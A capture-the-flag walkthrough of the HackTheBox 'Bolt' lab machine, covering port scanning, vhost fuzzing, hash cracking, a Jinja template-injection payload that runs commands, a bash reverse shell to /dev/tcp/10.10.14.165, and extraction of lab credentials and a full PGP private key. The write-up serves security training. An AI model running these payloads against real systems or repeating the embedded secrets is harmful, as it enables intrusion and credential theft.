# Bolt Machine(10.10.11.114)

It was

![Screenshot from 2022-02-19 19-36-01](https://user-images.githubusercontent.com/79413473/154804964-e23b99cf-bb5f-4433-acd2-801bb128a456.png)


## Recon:
+ strating port scan `rustscan -a 10.10.11.114 -u 5000 -- -A` we get 3 open ports
```
22/tcp  open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     syn-ack nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 76362BB7970721417C5F484705E5045D
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About 
443/tcp open  ssl/http syn-ack nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 82C6406C68D91356C9A729ED456EECF4
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Issuer: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-24T19:11:23
| Not valid after:  2022-02-24T19:11:23
| MD5:   3ac3 4f7c ee22 88de 7967 fe85 8c42 afc6
| SHA-1: c606 ca92 404f 2f04 6231 68be c4c4 644f e9ed f132
| -----BEGIN CERTIFICATE-----
| MIIDozCCAougAwIBAgIUWYR6DcMDhx5i4CpQ5qkkspuUULAwDQYJKoZIhvcNAQEL
| BQAwYTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDEaMBgGA1UEAwwRcGFzc2JvbHQuYm9s
| dC5odGIwHhcNMjEwMjI0MTkxMTIzWhcNMjIwMjI0MTkxMTIzWjBhMQswCQYDVQQG
| EwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lk
| Z2l0cyBQdHkgTHRkMRowGAYDVQQDDBFwYXNzYm9sdC5ib2x0Lmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALPBsFKzUPba5tHWW85u/Do3CkSsUgWN
| Wp5ZShD3T3hRX+vxFjv0zVZaccLhY8gsoTaklvFZVrguU6rIKHCFpRt7JLSPCmx3
| /Dy8id1Fm3VgRStVcMdXFnWne3lZaw9cSqdAxzb6ZcERAZRlIOPj29zO5UIwvwTW
| FJwybndHlxZ9Y8TUT7O1z5FFNKMl/QP6DBdkDDTc+OQ9ObyYHd6zBdwfuJykX8Md
| 3ejO1n38j8zXhzB/DEwKVKqFqvm7K28OBOouOaHnqM5vO5OVEVNyeZhaOtX1UrOm
| c+B8RSHDU7Y7/6sbNxJGuwpJZtovUa+2HybDRJl92vnNeouddrdFZc0CAwEAAaNT
| MFEwHQYDVR0OBBYEFCjzBazWUuLcpQnqbcDsisjmzvYzMB8GA1UdIwQYMBaAFCjz
| BazWUuLcpQnqbcDsisjmzvYzMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQEL
| BQADggEBAA2qDGXEgqNsf4XqYqK+TLg+pRJ/rrdAFtxNwn8MYQv4ZlyouQsN2zPm
| t/dXls0iba1KvgYrt5QGWGODI8IkaujEDC452ktOmmi9+EnpK9DjKoKfCTL4N/ta
| xDZxR4qHrk35QVYB8jYVP8S98gu5crTkAo9TGiHoEKPvinx+pA9IHtynqh9pBbuV
| /micD+zMBVlZ50MILbcXqsBHRxHN4pmbcfc4yEOanNVJD3hmGchcyAFx2RLPsl36
| +QrGlwqpP7Bn7wzVCuxzQUWlA9VwVZKHYVVvCekvVP9DKL6FfI5avLgJJujQTqKw
| +uYRUUWj+CdI1oxxYt0SdimXHr81SgE=
|_-----END CERTIFICATE-----
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```  
+ From the ssl cert name add **bolt.hbt** & **passbolt.bolt.htb** to /etc/hosts file.

![Screenshot from 2022-02-19 19-45-54](https://user-images.githubusercontent.com/79413473/154805088-9a371c35-0873-4056-a3ed-df6672ba2565.png)

+ passbolt redirect to login
![Screenshot from 2022-02-19 20-00-01](https://user-images.githubusercontent.com/79413473/154805120-a4a24946-7d2e-47ad-a3e2-1c57ca7b14fc.png)

+ Vhost fuzzing gives two new domain *mail & demo* . Add them also to hosts file
```
ffuf -u http://bolt.htb/ -w ~/wordlist/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.bolt.htb" -fs 30347
```
![Screenshot from 2022-02-19 20-12-01](https://user-images.githubusercontent.com/79413473/154805636-d4ef4d38-4ff9-4c75-9260-df02886c51ab.png)

![Screenshot from 2022-02-19 20-11-52](https://user-images.githubusercontent.com/79413473/154805666-1ebad463-a9f0-4052-80ef-eb28b596ae98.png)




## Foothold:

### Admin Panel Access on bolt.htb
+ From *bolt.htb/download* page download the tar file, and extract it using `tar -xvf image.tar`.
+ You will get a lot of files from here you will have to manually extract *layer.tar* file in each directory and look for useful infomration. Toughest thing about this box was this.
+ Now in direcoty *a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2* you will get *db.sqllite3* file and let's connect to this database.
+ `sqlite3 db.sqlite3`, and we  can get admin's hash from this.
![Screenshot from 2022-02-19 21-07-25](https://user-images.githubusercontent.com/79413473/154807729-a055c952-491b-49f8-bf8a-78a70c16b89f.png)

+ Now we can crack this hash easily using hashcat. I recommend watching [this](https://www.youtube.com/watch?v=5pd9n4BTYp0) video of superhero1 if you don't have strong pc to crack hashes. he shows how you can use google colab to crack hashes on cloud and i loved this personally, it's superfast. 
```
hashcat -m 500 hash wordlist/rockyou.txt

Output:
$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt
```
+ Login into admin dashboard with **admin:deadbolt**

![Screenshot from 2022-02-19 21-13-05](https://user-images.githubusercontent.com/79413473/154807928-d30f7c60-6249-433c-a24c-90698282a706.png)

### Creating account on demo.bolt.htb
+ On **demo.bolt.htb** go to register page. You will see it needs and INVITE_KEY to create an account. Poking aroung in tar file we downloaded you will get invote key also in *41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer/app/base/routes.py*

```
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code	  = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
            # Check usename exists
            user = User.query.filter_by(username=username).first()
            if user:.
                return render_template( 'accounts/register.html', 
                                    msg='Username already registered',
                                    success=False,
                                    form=create_account_form)
```


+ Now using this key i created an account with creds **newrouge:newrouge** on demo.bolt.htb. Now this demo website gives us similar web page after login as we got from **bolt.htb** dashboard, just with lot more features.

![Screenshot from 2022-02-19 21-30-07](https://user-images.githubusercontent.com/79413473/154808518-5e0a9cfb-dd9d-4617-92f5-d5688215b2ac.png)

+ You can also login to your mail account on **mail.bolt.htb** with same creds. Looks like application automatically created this for you.

![Screenshot from 2022-02-19 21-32-59](https://user-images.githubusercontent.com/79413473/154808620-9211a19d-e7c7-41e6-84d9-ae6287928f60.png)

+ Now there is feature in demo which was not in admin dashboard on bolt. You can edit your profile.

![2022-02-19_21-35](https://user-images.githubusercontent.com/79413473/154808756-9a23579a-6d94-41e4-bb01-673741d68c75.png)

+ let's edit our profile here

![Screenshot from 2022-02-19 21-37-26](https://user-images.githubusercontent.com/79413473/154808791-6301046d-a010-49c2-a046-49e8635adbb2.png)

+ You will notice that you got an email regarding profile update in **mail.bolt.htb**.

![Screenshot from 2022-02-19 21-38-36](https://user-images.githubusercontent.com/79413473/154808833-324bce9f-7233-4b92-9aaf-85f0fe9011dd.png)

+ Click the link you will be redirected to your dasboard but keep an eye on mail and you will see that you get an new email with name update notifications.

![Screenshot from 2022-02-19 21-40-25](https://user-images.githubusercontent.com/79413473/154808987-ac0316f1-efcb-4072-88f1-e98b178dab3f.png)

+ Now as my payload `<h1>mango</h1>` got fired it confirms there is HTML injection and xss on **mail.bolt.htb** from payload injected on **demo.bolt.htb** name field. But this is of not much use. As it's a python application let's go towards SSTI.

+ Add `{{7*7}}` to name field and update it. As expected it's reflected as 49.

![Screenshot from 2022-02-19 21-45-53](https://user-images.githubusercontent.com/79413473/154809165-683b3386-4dde-42bd-9f9d-9ba14bc11365.png)

+ We can execute command on this by climbing up to base class of current object and then accessing **popen** subclass. i have explained this in detail in [this](https://newrouge.blogspot.com/2022/02/epsilon-hackthebox.html) blogspot.

+ Using this payload we got code execution:
```
{{ ''.__class__.__mro__[1].__subclasses__()[222]("id", shell=True, stdout=-1).communicate() }}
```  
+ Get a reverse shell with this paylaod 
```
{{ ''.__class__.__mro__[1].__subclasses__()[222]("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.165/8084 0>&1'", shell=True, stdout=-1).communicate() }}
``` 
+ If your reverse shell keeps dying after some time, use **setsid** command before reverse shell as it starts process in new session.

![Screenshot from 2022-02-19 22-32-51](https://user-images.githubusercontent.com/79413473/154810903-4fb38d8a-0903-4e16-b2e1-4d0de3f9309e.png)

## Lateral movement:

+ After looking around for passwords i got 2 password **bolt_dba : dXUUHSW9vBpH5qRB** & **roundcubeuser:WXg5He2wHt4QYHuyGET**. but none of them is reused anywhere you can login into databases with them. Now looking at */etc/nginx/sites-enabled/nginx-passbolt.conf*

```
root /usr/share/php/passbolt/webroot;
  index index.php;
  #error_log /var/log/nginx/passbolt-error.log info;
  access_log /var/log/nginx/passbolt-access.log;

  # Managed by Passbolt
  include /etc/passbolt/nginx-ssl.conf;

  location / {
    try_files $uri $uri/ /index.php?$args;
  }
``` 
+ searching through passwords in */usr/share/php/passbolt/webroot* fot nothing then finally we get something in */etc/passbolt*. 
+ `cat /etc/passbolt/passbolt.php`

```
// Database configuration.
    'Datasources' => [
        'default' => [
            'host' => 'localhost',
            'port' => '3306',
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',

```
+ You can use this password to login as eddie via ssh **not** su eddie.
+ Now when you ssh, you get a notification that you got a mail. And mails are in */var/mail/*. Read eddie's mail .

```
From clark@bolt.htb  Thu Feb 25 14:20:19 2021
Return-Path: <clark@bolt.htb>
X-Original-To: eddie@bolt.htb
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001)
	id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
Subject: Important!
To: <eddie@bolt.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20210225212019.DFF264CD@bolt.htb>
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
From: Clark Griswold <clark@bolt.htb>

Hey Eddie,

The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...

-Clark
``` 
+ clark talks about some private keys, we have seen gpg all over the box it maybe pgp keys. Also there is mention of browser. If you will run linpeas on machine you will see that some google-chrome extension is lyting in eddie's *.config* directory.

![Screenshot from 2022-02-20 00-19-46](https://user-images.githubusercontent.com/79413473/154814765-69e41675-a58b-4251-895b-346697660dcb.png)

+ When you log into mysql as passbolt you also see some pgp encrypted message in **secrets** table.

![Screenshot from 2022-02-20 00-22-05](https://user-images.githubusercontent.com/79413473/154814914-cb7c1863-5eb0-433c-8a36-4b9d73fb5fcf.png)

+ Copy that your machine, we will need pgp keys to decrypt this message. Let's search through google-chrome folder. Had to take some help in discord server to find that.

+ Now you can grep for "PGP PRIVATE KEY" in that folder and this is the file you want 

```
/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log
```

+ Now read this file and copy paste pgp private keys from there. You have to reformat the line break to bring key in correct format.

![Screenshot from 2022-02-20 00-41-04](https://user-images.githubusercontent.com/79413473/154815459-989550d7-e4d4-44b1-9ab0-3d68d8e53a2e.png)

+ correct formatted pgp private key

```
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi
fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk
cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU
RNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU
+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a
If70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB
AAH+CQMINK+e85VtWtjguB8IR+AfuDbIzHyKKvMfGStRhZX5cdsUfv5znicW
UjeGmI+w7iQ+WYFlmjFN/Qd527qOFOZkm6TgDMUVubQFWpeDvhM4F3Y+Fhua
jS8nQauoC87vYCRGXLoCrzvM03IpepDgeKqVV5r71gthcc2C/Rsyqd0BYXXA
iOe++biDBB6v/pMzg0NHUmhmiPnSNfHSbABqaY3WzBMtisuUxOzuvwEIRdac
2eEUhzU4cS8s1QyLnKO8ubvD2D4yVk+ZAxd2rJhhleZDiASDrIDT9/G5FDVj
QY3ep7tx0RTE8k5BE03NrEZi6TTZVa7MrpIDjb7TLzAKxavtZZYOJkhsXaWf
DRe3Gtmo/npea7d7jDG2i1bn9AJfAdU0vkWrNqfAgY/r4j+ld8o0YCP+76K/
7wiZ3YYOBaVNiz6L1DD0B5GlKiAGf94YYdl3rfIiclZYpGYZJ9Zbh3y4rJd2
AZkM+9snQT9azCX/H2kVVryOUmTP+uu+p+e51z3mxxngp7AE0zHqrahugS49
tgkE6vc6G3nG5o50vra3H21kSvv1kUJkGJdtaMTlgMvGC2/dET8jmuKs0eHc
Uct0uWs8LwgrwCFIhuHDzrs2ETEdkRLWEZTfIvs861eD7n1KYbVEiGs4n2OP
yF1ROfZJlwFOw4rFnmW4Qtkq+1AYTMw1SaV9zbP8hyDMOUkSrtkxAHtT2hxj
XTAuhA2i5jQoA4MYkasczBZp88wyQLjTHt7ZZpbXrRUlxNJ3pNMSOr7K/b3e
IHcUU5wuVGzUXERSBROU5dAOcR+lNT+Be+T6aCeqDxQo37k6kY6Tl1+0uvMp
eqO3/sM0cM8nQSN6YpuGmnYmhGAgV/Pj5t+cl2McqnWJ3EsmZTFi37Lyz1CM
vjdUlrpzWDDCwA8VHN1QxSKv4z2+QmXSzR5FZGRpZSBKb2huc29uIDxlZGRp
ZUBib2x0Lmh0Yj7CwI0EEAEIACAFAmA4G2EGCwkHCAMCBBUICgIEFgIBAAIZ
AQIbAwIeAQAhCRAcJ0Gj3DtKvRYhBN9Ca8ekqK9Y5Q7aDhwnQaPcO0q9+Q0H
/R2ThWBN8roNk7hCWO6vUH8Da1oXyR5jsHTNZAileV5wYnN+egxf1Yk9/qXF
nyG1k/IImCGf9qmHwHe+EvoDCgYpvMAQB9Ce1nJ1CPqcv818WqRsQRdLnyba
qx5j2irDWkFQhFd3Q806pVUYtL3zgwpupLdxPH/Bj2CvTIdtYD454aDxNbNt
zc5gVIg7esI2dnTkNnFWoFZ3+j8hzFmS6lJvJ0GN+Nrd/gAOkhU8P2KcDz74
7WQQR3/eQa0m6QhOQY2q/VMgfteMejlHFoZCbu0IMkqwsAINmiiAc7H1qL3F
U3vUZKav7ctbWDpJU/ZJ++Q/bbQxeFPPkM+tZEyAn/fHwwYEYDgbYQEIAJpY
HMNw6lcxAWuZPXYz7FEyVjilWObqMaAael9B/Z40fVH29l7ZsWVFHVf7obW5
zNJUpTZHjTQV+HP0J8vPL35IG+usXKDqOKvnzQhGXwpnEtgMDLFJc2jw0I6M
KeFfplknPCV6uBlznf5q6KIm7YhHbbyuKczHb8BgspBaroMkQy5LHNYXw2FP
rOUeNkzYjHVuzsGAKZZzo4BMTh/H9ZV1ZKm7KuaeeE2x3vtEnZXx+aSX+Bn8
Ko+nUJZEn9wzHhJwcsRGV94pnihqwlJsCzeDRzHlLORF7i57n7rfWkzIW8P7
XrU7VF0xxZP83OxIWQ0dXd5pA1fN3LRFIegbhJcAEQEAAf4JAwizGF9kkXhP
leD/IYg69kTvFfuw7JHkqkQF3cBf3zoSykZzrWNW6Kx2CxFowDd/a3yB4moU
KP9sBvplPPBrSAQmqukQoH1iGmqWhGAckSS/WpaPSEOG3K5lcpt5EneFC64f
a6yNKT1Z649ihWOv+vpOEftJVjOvruyblhl5QMNUPnvGADHdjZ9SRmo+su67
JAKMm0cf1opW9x+CMMbZpK9m3QMyXtKyEkYP5w3EDMYdM83vExb0DvbUEVFH
kERD10SVfII2e43HFgU+wXwYR6cDSNaNFdwbybXQ0quQuUQtUwOH7t/Kz99+
Ja9e91nDa3oLabiqWqKnGPg+ky0oEbTKDQZ7Uy66tugaH3H7tEUXUbizA6cT
Gh4htPq0vh6EJGCPtnyntBdSryYPuwuLI5WrOKT+0eUWkMA5NzJwHbJMVAlB
GquB8QmrJA2QST4v+/xnMLFpKWtPVifHxV4zgaUF1CAQ67OpfK/YSW+nqong
cVwHHy2W6hVdr1U+fXq9XsGkPwoIJiRUC5DnCg1bYJobSJUxqXvRm+3Z1wXO
n0LJKVoiPuZr/C0gDkek/i+p864FeN6oHNxLVLffrhr77f2aMQ4hnSsJYzuz
4sOO1YdK7/88KWj2QwlgDoRhj26sqD8GA/PtvN0lvInYT93YRqa2e9o7gInT
4JoYntujlyG2oZPLZ7tafbSEK4WRHx3YQswkZeEyLAnSP6R2Lo2jptleIV8h
J6V/kusDdyek7yhT1dXVkZZQSeCUUcQXO4ocMQDcj6kDLW58tV/WQKJ3duRt
1VrD5poP49+OynR55rXtzi7skOM+0o2tcqy3JppM3egvYvXlpzXggC5b1NvS
UCUqIkrGQRr7VTk/jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGU
Nsw+14+EGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTf
QmvHpKivWOUO2g4cJ0Gj3DtKvf4dB/9CGuPrOfIaQtuP25S/RLVDl8XHvzPm
oRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg
6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/
Ic3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8
11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm
YZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0
PSwYYWlAywj5
=cqxZ
-----END PGP PRIVATE KEY BLOCK-----
``` 

![Screenshot from 2022-02-20 00-43-14](https://user-images.githubusercontent.com/79413473/154815541-11886e2d-5883-438d-a0af-8427a23d28dd.png)

+ Now you can decrypt the message by this command `gpg -d message`. But you will get an error, *no secret key*, you will need to first import the private key into gpg. 
+ We also need to crack this gpg private key , for that we will need tool *gpg2john*, i struggled with other sources. Also normal john-the-ripper doesn't wotk for me. Only Ubuntu snap's john-the-ripper works on my mcahine. Fortunately it also has package for gpg2john.

![Screenshot from 2022-02-20 00-46-35](https://user-images.githubusercontent.com/79413473/154815662-f8d6b3d3-3a0a-4564-91a7-981ebc723acd.png)

+ `john-the-ripper.gpg2john private_key > hash`.
+ Now we can crack this hash with john-the-ripper. For some reason i couldn't crack it again. As john-the-ripper won't crack it agian. I got a solution i removed john-the-ripper and installed it again and now it was brand new and cracked it.

![Screenshot from 2022-02-20 01-50-24](https://user-images.githubusercontent.com/79413473/154817713-78d80444-b8c0-496e-9b83-dfd14396413b.png)

+ Let's import the pgp key. `gpg --import private.key`. Enter the password **merrychristmas**. 
+ Decrypt the message recovered from database. `gpg -d message`. It will aks for password again.

```
gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25
      "Eddie Johnson <eddie@bolt.htb>"
{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}gpg: Signature made Saturday 06 March 2021 09:03:54 PM IST
gpg:                using RSA key 1C2741A3DC3B4ABD
gpg: Good signature from "Eddie Johnson <eddie@bolt.htb>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD
``` 

+ It gives a password. which doesn't authenticate as clark and doesn't ssh as root also. But you can do **su root** with this password and we got finally root on this box.








